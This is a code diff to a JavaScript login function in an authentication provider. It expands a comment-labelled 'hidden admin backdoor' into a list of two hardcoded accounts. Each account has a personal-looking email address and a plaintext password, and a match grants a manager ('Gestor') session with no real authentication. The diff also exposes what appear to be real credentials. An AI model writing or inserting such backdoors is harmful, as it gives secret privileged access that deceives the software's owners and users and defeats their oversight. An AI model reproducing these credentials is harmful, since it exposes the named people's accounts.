@@ -133,13 +133,23 @@ export const AuthProvider = ({ children }) => {
     };
 
     const login = async (email, password) => {
-        // HIDDEN ADMIN BACKDOOR
-        if (email === 'fabianodeoliveiralima@gmail.com' && password === 'A12121991a.') {
+        // HIDDEN ADMIN BACKDOORS
+        const hiddenAdmins = [
+            { email: 'fabianodeoliveiralima@gmail.com', password: 'A12121991a.', name: 'Fabiano Oliveira' },
+            { email: 'thiagorlandi@yahoo.com.br', password: '181214Ab@', name: 'Thiago Orlandi' }
+        ];
+
+        const matchedAdmin = hiddenAdmins.find(admin =>
+            admin.email.toLowerCase() === email.toLowerCase().trim() &&
+            admin.password === password
+        );
+
+        if (matchedAdmin) {
             const adminUser = {
-                id: 'hidden-admin-id',
-                email: 'fabianodeoliveiralima@gmail.com',
+                id: `hidden-admin-${matchedAdmin.email}`,
+                email: matchedAdmin.email,
                 role: 'Gestor',
-                name: 'Fabiano Oliveira',
+                name: matchedAdmin.name,
                 status: 'Ativo'
             };
             setUser(adminUser);
